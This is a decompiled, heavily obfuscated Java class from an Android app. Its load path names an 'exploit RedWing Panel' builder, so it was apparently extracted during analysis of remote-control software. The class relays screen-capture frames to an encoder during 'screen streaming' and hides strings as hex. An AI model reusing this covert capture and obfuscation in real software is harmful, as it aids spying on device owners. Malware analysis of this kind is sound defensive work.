package v.s;

import android.graphics.Bitmap;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class tqMsvBGMHi2d1wCf3x extends LGm23hksIOxB implements deLJ4Z0aL3hcJ3O1 {
    public final /* synthetic */ Object Ee8d2j4S9Vm5yGuR;
    public final /* synthetic */ Object JXn4Qf7zpnLjP5;
    public final /* synthetic */ int vekpFI4d1Nc4fakF;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ tqMsvBGMHi2d1wCf3x(Object obj, int i, Object obj2) {
        super(1);
        this.vekpFI4d1Nc4fakF = i;
        this.JXn4Qf7zpnLjP5 = obj;
        this.Ee8d2j4S9Vm5yGuR = obj2;
    }

    private static /* synthetic */ void morlnyalk() {
    }

    @Override // v.s.deLJ4Z0aL3hcJ3O1
    public final Object pyu8ovAipBTLYAiKab(Object obj) {
        switch (this.vekpFI4d1Nc4fakF) {
            case 0:
                Bitmap bitmap = (Bitmap) obj;
                g78iUtGnOvef g78iutgnovef = (g78iUtGnOvef) this.JXn4Qf7zpnLjP5;
                try {
                    DataQFAdapter.Companion.getClass();
                    if (DataQFAdapter.isScreenStreaming) {
                        if (bitmap != null) {
                            try {
                                lLybWDNhgEj7LwIe llybwdnhgej7lwie = DataQFAdapter.hwEncoder;
                                if (llybwdnhgej7lwie != null) {
                                    llybwdnhgej7lwie.dDIMxZXP1V8HdM(bitmap);
                                }
                            } catch (Throwable th) {
                                String unused = DataQFAdapter.TAG;
                                TypefaceCache.obtain("00250073005E008300D200B600C600AA00220066001B008200E200AD00DD00B500790036");
                                th.getMessage();
                                g78iutgnovef.w9sT1Swbhx3hs++;
                            }
                            ((g78iUtGnOvef) this.Ee8d2j4S9Vm5yGuR).w9sT1Swbhx3hs++;
                        } else {
                            g78iutgnovef.w9sT1Swbhx3hs++;
                        }
                        DataQFAdapter.Companion.getClass();
                        break;
                    }
                    DataQFAdapter.h264CaptureInFlight = false;
                    return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
                } catch (Throwable th2) {
                    DataQFAdapter.Companion.getClass();
                    DataQFAdapter.h264CaptureInFlight = false;
                    throw th2;
                }
            case 1:
                byte[] bArr = (byte[]) obj;
                DataQFAdapter.Companion.getClass();
                if (DataQFAdapter.isScreenStreaming) {
                    if (bArr != null) {
                        DataQFAdapter.latestFrame.set(bArr);
                        ((g78iUtGnOvef) this.JXn4Qf7zpnLjP5).w9sT1Swbhx3hs++;
                    } else {
                        ((g78iUtGnOvef) this.Ee8d2j4S9Vm5yGuR).w9sT1Swbhx3hs++;
                    }
                }
                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
            default:
                ((zcffvBooRp7uR1q) this.JXn4Qf7zpnLjP5).vekpFI4d1Nc4fakF.removeCallbacks((UubaJZRp66jTeLre) this.Ee8d2j4S9Vm5yGuR);
                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
        }
    }
}
